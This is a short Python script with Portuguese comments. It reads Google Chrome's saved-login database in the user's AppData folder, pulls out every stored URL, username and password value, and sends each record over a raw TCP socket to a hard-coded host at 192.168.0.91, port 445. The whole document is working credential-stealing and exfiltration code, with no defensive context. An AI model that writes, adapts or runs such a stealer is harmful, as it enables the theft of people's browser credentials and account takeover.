import sqlite3
import os
import socket

#IP do Servidor
dest = ('192.168.0.91', 445)

#inciando conexao TCP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(dest)

# Local do arquivo com senhas
dbfile = os.path.expanduser('~') + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'

# Acessando o arquivo
con = sqlite3.connect(dbfile)

# Criando o cursor para analisar o arquivo
cur = con.cursor()

# Lendo a tabela com o cursor
cur.execute("SELECT origin_url, username_value, password_value FROM logins")

#Apresentando os dados
for index, login in enumerate(cur.fetchall()):
    url = login[0]
    username = login[1]
    password = login[2]

    msgT = ("\nUrl: " + url + "\nUser: " + username + "\nPassword: " + str(password) + "\n")
    print(msgT)
    s.send(msgT.encode('utf-8'))

# finalizando a conexão com o arquivo
con.close()
s.close()
